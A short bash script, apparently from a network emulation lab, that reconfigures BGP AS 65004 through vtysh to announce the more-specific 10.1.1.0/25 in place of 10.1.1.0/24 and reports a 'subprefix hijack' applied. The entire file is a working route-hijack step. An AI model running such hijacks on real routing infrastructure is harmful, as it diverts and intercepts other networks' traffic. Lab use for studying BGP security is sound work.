#!/bin/bash
vtysh -c 'configure terminal' -c 'router bgp 65004' -c 'no network 10.1.1.0/24' -c 'network 10.1.1.0/25' -c 'end'
IFACE=$(ip -o -4 addr show | awk '$4 ~ /^10\.6\.1\.1\// {print $2}')
ip route del 10.1.1.0/24 dev "$IFACE" 2>/dev/null || echo "del /24: (maybe gone)"
ip route add 10.1.1.0/25 dev "$IFACE" 2>/dev/null || echo "add /25: (maybe exists)"
echo "subprefix hijack applied on $IFACE"
